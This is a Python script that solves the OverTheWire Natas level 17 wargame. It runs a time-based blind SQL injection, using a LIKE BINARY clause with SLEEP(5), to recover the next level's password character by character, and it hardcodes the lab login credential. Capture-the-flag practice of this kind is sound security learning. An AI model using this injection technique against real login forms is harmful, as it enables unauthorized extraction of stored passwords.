#!/usr/bin/env python3


import requests
import sys
from string import ascii_lowercase,ascii_uppercase,digits

char_set=ascii_lowercase + ascii_uppercase + digits

url='http://natas17.natas.labs.overthewire.org/'

s=requests.Session()
s.auth=('natas17','EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC')
sqli = 'natas18" AND password LIKE BINARY "'
sleep_sqli='" AND SLEEP(5)-- '

password=""
while len(password)<32:
	for char in char_set:
		try:
			payload={'username':sqli + password + char + "%" + sleep_sqli}
			r=s.post(url,data=payload,timeout=1)
		except requests.Timeout:
			sys.stdout.write(char)
			sys.stdout.flush()
			password+=char
			break


